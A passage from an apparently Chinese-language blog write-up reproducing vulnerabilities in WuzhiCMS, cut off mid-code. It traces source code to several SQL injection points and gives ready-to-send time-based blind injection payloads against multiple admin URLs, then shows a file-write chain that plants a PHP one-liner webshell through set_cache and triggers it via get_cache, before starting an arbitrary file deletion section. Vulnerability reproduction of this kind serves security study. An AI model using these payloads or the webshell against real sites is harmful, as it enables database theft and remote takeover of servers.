class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_param_sql</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>,<span class="hljs-variable">$param</span> = <span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_page_list_count</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>,<span class="hljs-variable">$param</span> = <span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_page_list</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>,<span class="hljs-variable">$param</span> = <span class="hljs-keyword">array</span>(<span class="hljs-params"></span>), <span class="hljs-variable">$page</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$pagesize</span> = <span class="hljs-number">0</span> </span>) </span>&#123;<br>都是无用法的<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">query</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>, <span class="hljs-variable">$type</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$cachetime</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-comment">//if($_SERVER[&#x27;REMOTE_ADDR&#x27;]==&#x27;127.0.0.1&#x27;) echo $sql.&quot;&lt;br&gt;&quot;;</span><br><span class="hljs-variable">$func</span> = <span class="hljs-variable">$type</span> == <span class="hljs-string">&#x27;UNBUFFERED&#x27;</span> &amp;&amp; @<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;mysql_unbuffered_query&#x27;</span>) ? <span class="hljs-string">&#x27;mysql_unbuffered_query&#x27;</span> : <span class="hljs-string">&#x27;mysql_query&#x27;</span>;<br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$query</span> = <span class="hljs-variable">$func</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable language_">$this</span>-&gt;link)) &amp;&amp; <span class="hljs-variable">$type</span> != <span class="hljs-string">&#x27;SILENT&#x27;</span>) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">halt</span>(<span class="hljs-string">&#x27;MySQL Query Error&#x27;</span>, <span class="hljs-variable">$sql</span>);<br>&#125;<br><span class="hljs-variable language_">$this</span>-&gt;querynum++;<br><span class="hljs-variable language_">$this</span>-&gt;histories[] = <span class="hljs-variable">$sql</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$query</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>只能从query追踪到delete的定义(存在对query的调用)</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-variable">$where</span> ? <span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$where</span>: <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;DELETE FROM `&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;tablepre.<span class="hljs-variable">$table</span>.<span class="hljs-string">&#x27;`&#x27;</span>.<span class="hljs-variable">$where</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br><span class="hljs-comment">#它把$sql参数当作sql语句执行了,可能存在sql</span><br></code></pre></td></tr></table></figure><ol start="3"><li>追踪参数$where</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listing</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-variable">$siteid</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;siteid&#x27;</span>);<br>       <span class="hljs-variable">$page</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) ? <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) : <span class="hljs-number">1</span>;<br>       <span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-variable">$page</span>,<span class="hljs-number">1</span>);<br>       <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>])) &#123;<br>           <span class="hljs-variable">$keywords</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>];<br>           <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`name` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-variable">$where</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>       &#125;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;copyfrom&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>,<span class="hljs-variable">$page</span>);<br><span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>       <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br><span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;copyfrom_listing&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li><p>&#x2F;index.php?m&#x3D;core&amp;f&#x3D;copyfrom&amp;v&#x3D;listing&amp;_su&#x3D;wuzhicms 搜索框存在注入</p><p>(copyfrom文件下的listing方法中存在一个可控全局变量参数keywords由$where控制)</p></li><li><p>测试抓包写入语句**(延时注入)**</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">m=core&amp;f=copyfrom&amp;v=listing&amp;_su=wuzhicms&amp;keywords=1&#x27; AND (SELECT 1228 FROM (SELECT(SLEEP(5)))jFgw)--+ JQJJ<br></code></pre></td></tr></table></figure></li></ol><p>其他注入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">POC：/wuzhicms/www/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=88888%bf%27/%2AAAA%2A//%2AAAA%2A/AND/%2AAAA%2A//%2AAAA%2A/%28SELECT/%2AAAA%2A//%2AAAA%2A/6572/%2AAAA%2A//%2AAAA%2A/FROM/%2AAAA%2A//%2AAAA%2A/%28SELECT%28SLEEP%284%29%29%29GZXQ%29--%20vLAW<br>POC：/wuzhicms/www/index.php?m=coupon&amp;f=card&amp;v=detail_listing&amp;_su=wuzhicms&amp;groupname=88888%bf%27/%2AAAA%2A//%2AAAA%2A/AND/%2AAAA%2A//%2AAAA%2A/%28SELECT/%2AAAA%2A//%2AAAA%2A/6572/%2AAAA%2A//%2AAAA%2A/FROM/%2AAAA%2A//%2AAAA%2A/%28SELECT%28SLEEP%284%29%29%29GZXQ%29--%20vLAW<br>POC：wuzhicms/www/index.php?m=order&amp;f=card&amp;v=listing&amp;_su=wuzhicms&amp;keytype=1&amp;batchid=123d%27/%2AAAA%2A//%2AAAA%2A/AND/%2AAAA%2A//%2AAAA%2A/%28SELECT/%2AAAA%2A//%2AAAA%2A/3462/%2AAAA%2A//%2AAAA%2A/FROM/%2AAAA%2A//%2AAAA%2A/%28SELECT%28SLEEP%284%29%29%29aR%29--%20<br>POC：/wuzhicms/www/index.php?m=order&amp;f=goods&amp;v=listing&amp;_su=wuzhicms&amp;keywords=888111&amp;keytype=0&amp;cardtype=188%27/%2AAAA%2A//%2AAAA%2A/AND/%2AAAA%2A//%2AAAA%2A/%28SELECT/%2AAAA%2A//%2AAAA%2A/3462/%2AAAA%2A//%2AAAA%2A/FROM/%2AAAA%2A//%2AAAA%2A/%28SELECT%28SLEEP%284%29%29%29aR%29--%20<br></code></pre></td></tr></table></figure><h2 id="复现2-sql"><a href="#复现2-sql" class="headerlink" title="复现2(sql)"></a>复现2(sql)</h2><p>coreframe\app\promote\admin\index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$siteid</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;siteid&#x27;</span>);<br>    <span class="hljs-variable">$page</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) ? <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) : <span class="hljs-number">1</span>;<br>    <span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-variable">$page</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$fieldtype</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;fieldtype&#x27;</span>];<br>    <span class="hljs-variable">$keywords</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fieldtype</span>==<span class="hljs-string">&#x27;place&#x27;</span>) &#123;<br>        <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `name` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote_place&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;pid ASC&#x27;</span>);<br>        <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>        <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listingplace&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `<span class="hljs-subst">$fieldtype</span>` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote&#x27;</span>,<span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;id DESC&#x27;</span>);<br>        <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>        <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listing&#x27;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>获取到的keywords参数拼接到SQL语句，然后带入数据库执行，导致程序在实现上存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=1111%&#x27;*%23(拼接sql语句)<br></code></pre></td></tr></table></figure><h2 id="复现3-文件写入"><a href="#复现3-文件写入" class="headerlink" title="复现3(文件写入)"></a>复现3(文件写入)</h2><ol><li><p>寻找file_put_contents 函数的参数是否可控制</p><p>coreframe\app\core\libs\function\common.func.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 写入缓存</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $filename 文件名</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $data 数组或者字符串</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> string $dir 写入目录名，文件缓存写入：/caches/$dir</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> bool</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_cache</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;_cache_&#x27;</span></span>)</span>&#123;<br><span class="hljs-built_in">static</span> <span class="hljs-variable">$_dirs</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$dir</span> == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/([a-z0-9_]+)/i&#x27;</span>, <span class="hljs-variable">$filename</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-variable">$cache_path</span> = CACHE_ROOT . <span class="hljs-variable">$dir</span> . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>])) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$cache_path</span>)) &#123;<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$cache_path</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>&#125;<br><span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>] = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$cache_path</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;.&#x27;</span> . CACHE_EXT . <span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) &#123;<br><span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&lt;?php&#x27;</span> . <span class="hljs-string">&quot;\r\n return &quot;</span> . <span class="hljs-title function_ invoke__">array2string</span>(<span class="hljs-variable">$data</span>) . <span class="hljs-string">&#x27;?&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>file_put_contents存在于set_cache中，寻找定义</p><p>&#x2F;coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>         <span class="hljs-title function_ invoke__">set_cache</span>(M, <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;setting&#x27;</span>]);<br>         <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-variable">$show_dialog</span> = <span class="hljs-number">1</span>;<br>         <span class="hljs-title function_ invoke__">load_class</span>(<span class="hljs-string">&#x27;form&#x27;</span>);<br>         <span class="hljs-variable">$setting</span> = &amp;<span class="hljs-variable language_">$this</span>-&gt;_cache;<br>         <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$setting</span>[<span class="hljs-string">&#x27;show_mode&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$setting</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;show_mode&#x27;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;watermark_enable&#x27;</span>=&gt;<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;watermark_pos&#x27;</span>=&gt;<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;watermark_text&#x27;</span>=&gt;<span class="hljs-string">&#x27;www.wuzhicms.com&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">set_cache</span>(M, <span class="hljs-variable">$setting</span>);<br>&#125;<br>         <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;set&#x27;</span>, M);<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>\coreframe\app\tags\admin\index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;dosubmit&#x27;</span>]))<br> &#123;<br> <span class="hljs-variable">$cache_in_db</span> = <span class="hljs-title function_ invoke__">cache_in_db</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;setting&#x27;</span>], V, M);<br><br> <span class="hljs-title function_ invoke__">set_cache</span>(M, <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;setting&#x27;</span>]);<br> <span class="hljs-title function_ invoke__">MSG</span>( <span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br> &#125;<br> <span class="hljs-keyword">else</span><br> &#123;<br>             <span class="hljs-variable">$show_dialog</span> = <span class="hljs-number">1</span>;<br> <span class="hljs-title function_ invoke__">load_class</span>(<span class="hljs-string">&#x27;form&#x27;</span>);<br> <span class="hljs-title function_ invoke__">load_function</span>(<span class="hljs-string">&#x27;template&#x27;</span>);<br> <span class="hljs-variable">$templates</span> = <span class="hljs-title function_ invoke__">select_template</span>(M);<br> <span class="hljs-variable">$setting</span> = <span class="hljs-title function_ invoke__">cache_in_db</span>(<span class="hljs-string">&#x27;&#x27;</span>, V, M);<br> <span class="hljs-variable">$linkage</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;linkage&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;name,linkageid&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&quot;linkageid ASC&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;linkageid&#x27;</span>);<br> <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$linkage</span> AS <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)<br> &#123;<br> <span class="hljs-variable">$linkage</span>[<span class="hljs-variable">$k</span>] = <span class="hljs-variable">$v</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br> &#125;<br>     <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;set&#x27;</span>,M);<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>$data就是$GLOBALS[‘setting’]（可控）</p><p>$filename（不可控）</p></li><li><p>寻找一个可以包含该缓存文件的地方  $filename（搜索）</p><p>coreframe\app\core\libs\function\common.func.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_cache</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;_cache_&#x27;</span></span>)</span>&#123;<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">get_cache_path</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>查找get_cache用法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ueditor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>         <span class="hljs-variable">$cache_in_db</span> = <span class="hljs-title function_ invoke__">cache_in_db</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;setting&#x27;</span>], V, M);<br>         <span class="hljs-title function_ invoke__">set_cache</span>(V, <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;setting&#x27;</span>]);<br>         <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>     &#125;<br>     <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-variable">$setting</span> = <span class="hljs-title function_ invoke__">get_cache</span>(V);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$setting</span>)) <span class="hljs-variable">$setting</span> = <span class="hljs-title function_ invoke__">cache_in_db</span>(<span class="hljs-string">&#x27;&#x27;</span>, V, M);<br>         <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(V, M);<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure></li><li><p>ueditor()调用</p><p>编写语句</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">1 写入一句话木马到缓存文件</span><br>GET /wuzhicms/index.php?m=attachment&amp;f=index&amp;v=set&amp;_su=wuzhicms&amp;submit=1&amp;setting=&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">2 读取缓存文件</span><br>GET /wuzhicms/index.php?m=attachment&amp;f=index&amp;v=ueditor&amp;_su=wuzhicms<br></code></pre></td></tr></table></figure></li></ol><h2 id="复现4（后台任意文件删除）"><a href="#复现4（后台任意文件删除）" class="headerlink" title="复现4（后台任意文件删除）"></a>复现4（后台任意文件删除）</h2><ol><li><p>unlink函数 来找文件删除</p><p>coreframe\app\attachment\admin\index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">my_unlink</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$path</span>)) <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$path</span>);<br>  &#125;<br></code></pre></td></tr></table></figure></li><li><p>此文件下面还有   函数定义del调用了该功能点进行文件删除.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 